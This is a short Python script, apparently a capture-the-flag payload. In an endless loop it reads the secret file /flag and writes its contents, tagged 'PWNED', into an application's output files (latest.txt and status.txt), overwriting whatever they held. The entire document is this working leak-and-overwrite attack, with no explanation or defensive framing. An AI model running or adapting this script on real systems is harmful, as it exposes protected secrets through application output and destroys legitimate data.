import time
while True:
    try:
        d = open("/flag").read()
        with open("/app/data/output/latest.txt", "w") as o:
            o.write("PWNED " + d)
        with open("/app/data/output/status.txt", "w") as o:
            o.write(d)
    except Exception:
        pass
    time.sleep(0.1)
